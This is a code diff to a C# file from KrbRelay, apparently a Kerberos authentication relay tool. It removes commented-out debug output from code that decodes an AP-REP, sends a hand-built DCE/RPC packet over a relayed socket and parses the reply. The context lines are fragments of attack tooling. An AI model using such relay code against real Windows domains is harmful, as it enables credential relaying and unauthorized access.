@@ -117,7 +117,7 @@ namespace KrbRelay.Clients
 
 
                             apRep1 = Convert.FromBase64String(headerValue);
-//                            /Console.WriteLine("[**] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+
 
                             byte[] moreArray = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
                             byte[] buffer = new byte[4096];
@@ -142,19 +142,11 @@ namespace KrbRelay.Clients
 
                             Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
                             Program.currSourceSocket.Send(outbuffer);
-                            //Console.WriteLine(Program.HexDump(outbuffer));
-                            //Console.WriteLine(Program.HexDump(Program.AssocGroup, 16, 4));
-                            //Console.WriteLine(Program.HexDump(outbuffer,16,24));
-                            //Program.stream.Write(outbuffer, 0, outlen);
                             
 
 
-                            //int l = Program.stream.Read(buffer, 0, buffer.Length);
+                            
                             int l = Program.currSourceSocket.Receive(buffer);
-                           // Program.forwdardmode = true;
-                            //currSocketServer.state.isRelayed = false;
-
-                            //currSocketServer.CloseConnection(currSocketServer.state);
                             
 
                             int pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
@@ -215,10 +207,7 @@ namespace KrbRelay.Clients
                                 Console.WriteLine("[-] {0}", e);
                             }
 
-                           //Program.forwdardmode = true;
-                           //currSocketServer.state.isRelayed = false;
-                           //currSocketServer.CloseConnection(currSocketServer.state);
-                            
+                          
                             
                             return;
                         }
